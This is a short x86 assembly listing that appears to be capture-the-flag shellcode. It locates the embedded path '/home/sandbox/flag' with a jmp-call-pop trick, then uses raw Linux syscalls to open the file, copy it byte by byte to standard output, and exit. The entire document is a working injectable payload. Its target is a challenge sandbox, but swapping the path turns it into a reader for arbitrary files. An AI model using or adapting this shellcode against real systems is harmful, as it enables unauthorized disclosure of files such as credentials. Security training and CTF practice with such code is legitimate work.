BITS 32

        jmp short two
        one:
        pop ebx       ;open
        xor eax, eax
        xor ecx, ecx
        mov al, 5
        int 0x80
        mov esi, eax
        jmp short read

        exit:
        xor eax, eax
        inc eax
        int 0x80

read:
        mov ebx, esi
        xor eax, eax 
        mov al, 3
        dec esp
        mov ecx, esp
        xor edx, edx
        inc edx
        int 0x80
        test eax, eax 
        jz exit

        xor eax, eax ;write
        mov al, 4
        xor ebx, ebx
        inc ebx
        int 0x80
        inc esp
        jmp short read

        two:
        call one
        db "/home/sandbox/flag"
